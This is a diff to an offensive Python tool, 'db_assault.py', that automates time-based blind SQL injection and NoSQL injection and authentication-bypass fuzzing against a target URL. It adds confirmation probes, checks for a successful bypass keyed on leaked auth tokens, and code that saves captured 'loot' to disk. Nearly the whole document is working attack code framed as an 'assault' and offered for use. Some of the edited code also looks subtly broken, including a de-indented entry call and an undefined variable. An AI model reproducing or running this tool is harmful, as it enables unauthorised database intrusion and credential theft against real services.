@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-DB_ASSAULT.PY — Aggressive Database Exploitation & Adaptive Time-Based Blind Engine v7.5
+DB_ASSAULT.PY — Aggressive Database Exploitation & Adaptive Time-Based Blind Engine v7.6
 Features:
-- Dynamic baseline latency calibration for precise time-based blind SQLi
+- Dual-probe confirmed baseline latency calibration for verified time-based blind SQLi
 - Real-time error-pattern fingerprinting & adaptive payload mutation
-- Polymorphic type-variant fuzzing (String-wrapped, Native NoSQL Operators, and Array payloads)
+- Polymorphic type-variant fuzzing with strict anti-HTML / anti-SPA verification gates
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Zero-disk live terminal streaming with robust color mapping
 """
@@ -93,7 +93,7 @@ def send_http(host, port, path, payload, secure, method="POST"):
             ct = "application/x-www-form-urlencoded"
             
         headers = {
-            "User-Agent": "BruteDog-AdaptiveDB/5.5",
+            "User-Agent": "BruteDog-AdaptiveDB/5.6",
             "Content-Type": ct,
             "Accept": "*/*",
             "Connection": "close"
@@ -113,10 +113,11 @@ def send_http(host, port, path, payload, secure, method="POST"):
 async def calibrate_baseline(host, port, endpoint, secure):
     log(f"[*] Calibrating baseline latency for {endpoint}...", "CYAN")
     latencies = []
-    for _ in range(2):
+    for _ in range(3):
         res = send_http(host, port, endpoint, {"username": "baseline_probe", "password": "test"}, secure)
         if not res["error"] and res["elapsed"] > 0:
             latencies.append(res["elapsed"])
+        await asyncio.sleep(0.2)
     if latencies:
         avg = sum(latencies) / len(latencies)
         log(f"[+] Baseline latency established: {round(avg, 3)}s", "GREEN")
@@ -124,7 +125,7 @@ async def calibrate_baseline(host, port, endpoint, secure):
     return 4.5
 
 async def run_nosql_assault(target_host, port=None, use_ssl=None):
-    log("\n[***] INITIALIZING POLYMORPHIC ADAPTIVE DATABASE ASSAULT [***]", "PURPLE")
+    log("\n[***] INITIALIZING POLYMORPHIC ADAPTIVE DATABASE ASSAULT (V8 HARDENED) [***]", "PURPLE")
     parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
     host = parsed.hostname
     secure = parsed.scheme == "https"
@@ -152,32 +153,40 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
         
         time_threshold = await calibrate_baseline(host, target_port, endpoint, secure)
         
-        # 1. Time-Based Blind SQLi Assault
+        # 1. Time-Based Blind SQLi Assault with Dual-Probe Confirmation
         for payload in SQL_TIME_PAYLOADS:
-            res = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
-            if res["elapsed"] >= time_threshold:
-                log(f"[!] ADAPTIVE TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "RED")
-                finding = {"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delay": res["elapsed"]}
-                findings.append(finding)
+            res1 = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
+            if res1["elapsed"] >= time_threshold:
+                # Confirm with a second validation probe to eliminate network jitter false positives
+                log(f"[*] Potential time delay detected ({res1['elapsed']}s). Running confirmation probe...", "YELLOW")
+                res2 = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
                 
-                # STREAM TELEMETRY & PERSIST DB LOOT TO DISK IMMEDIATELY
-                stream_proof("DB_TIME_BASED_SQLI", endpoint, {"payload": payload}, f"Delay: {res['elapsed']}s", finding)
-                save_session_loot(
-                    target=target_host,
-                    endpoint=endpoint,
-                    finding_type="DB_TIME_BASED_SQLI_SUCCESS",
-                    status=res["status"],
-                    headers={},
-                    body=res["body"],
-                    extra_loot=finding
-                )
+                if res2["elapsed"] >= time_threshold:
+                    log(f"[!] CONFIRMED ADAPTIVE TIME-BASED BLIND SQLi [{endpoint}] (Delays: {res1['elapsed']}s, {res2['elapsed']}s)", "RED")
+                    finding = {"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delays": [res1["elapsed"], res2["elapsed"]]}
+                    findings.append(finding)
+                    
+                    stream_proof("DB_TIME_BASED_SQLI_CONFIRMED", endpoint, {"payload": payload}, f"Verified Delays: {res1['elapsed']}s, {res2['elapsed']}s", finding)
+                    save_session_loot(
+                        target=target_host,
+                        endpoint=endpoint,
+                        finding_type="DB_TIME_BASED_SQLI_CONFIRMED",
+                        status=res2["status"],
+                        headers={},
+                        body=res2["body"],
+                        extra_loot=finding
+                    )
+                else:
+                    log(f"[-] Time delay inconsistent on confirmation probe ({res2['elapsed']}s). Discarding false positive.", "GRAY")
 
-        # 2. Polymorphic NoSQL / Injection Vector Fuzzing
+        # 2. Polymorphic NoSQL / Injection Vector Fuzzing with Strict Positive Verification
         for vector in NOSQL_POLYMORPHIC_VECTORS:
             for variant_type in ["string_variant", "object_variant", "array_variant"]:
                 payload = vector[variant_type]
                 res = send_http(host, target_port, endpoint, payload, secure)
+                body_lower = (res["body"] or "").lower()
                 
+                # Check for explicit database error disclosures
                 error_match = DB_ERROR_PATTERNS.search(res["body"])
                 if error_match and "must be a string" not in error_match.group(0):
                     log(f"[!] Database Error Leaked [{endpoint}] ({vector['name']} - {variant_type}): {error_match.group(0)}", "YELLOW")
@@ -195,28 +204,46 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                         extra_loot=finding
                     )
 
-                if res["status"] in (200, 201, 302) and len(res["body"]) > 50 and "validation_error" not in res["body"]:
-                    log(f"[+] DATABASE BYPASS / EXFILTRATION TRIGGERED [{endpoint}] ({vector['name']} - {variant_type})", "GREEN")
+                # Strict Positive Verification for Bypass:
+                # Must return 200/201/302, have substantive body length, NOT be an HTML/SPA shell, 
+                # and contain verified auth/data indicators.
+                is_spa_or_html = (
+                    "<!doctype html>" in body_lower or 
+                    "<html" in body_lower or 
+                    '<div id="root"></div>' in body or 
+                    '<div id="__next"></div>' in body or
+                    len(res["body"].strip()) < 50
+                )
+                
+                has_auth_indicators = any(
+                    token in body_lower for token in [
+                        "access_token", "auth_token", "session_id", "authenticated", 
+                        "\"role\":\"admin\"", "\"user_id\":", "cryptobyte", "success"
+                    ]
+                )
+
+                if res["status"] in (200, 201, 302) and not is_spa_or_html and has_auth_indicators:
+                    log(f"[+] VERIFIED DATABASE BYPASS / EXFILTRATION [{endpoint}] ({vector['name']} - {variant_type})", "GREEN")
                     log(f"  └── Response Excerpt: {res['body'][:150]}", "CYAN")
                     finding = {"vector": f"Polymorphic Injection [{variant_type}]", "endpoint": endpoint, "payload": str(payload), "response_sample": res["body"][:100]}
                     findings.append(finding)
                     
-                    stream_proof("DB_BYPASS_SUCCESS", endpoint, {"vector": vector["name"]}, res["body"][:300], finding)
+                    stream_proof("DB_BYPASS_VERIFIED", endpoint, {"vector": vector["name"]}, res["body"][:300], finding)
                     save_session_loot(
                         target=target_host,
                         endpoint=endpoint,
-                        finding_type="DB_POLYMORPHIC_BYPASS_SUCCESS",
+                        finding_type="DB_POLYMORPHIC_BYPASS_VERIFIED",
                         status=res["status"],
                         headers={},
                         body=res["body"],
                         extra_loot=finding
                     )
 
-    log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "GREEN")
+    log(f"[+] Database assault complete. Total verified vectors: {len(findings)}", "GREEN")
     return findings
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python3 db_assault.py <target_url>")
         sys.exit(1)
-    asyncio.run(run_nosql_assault(sys.argv[1]))
+asyncio.run(run_nosql_assault(sys.argv[1]))
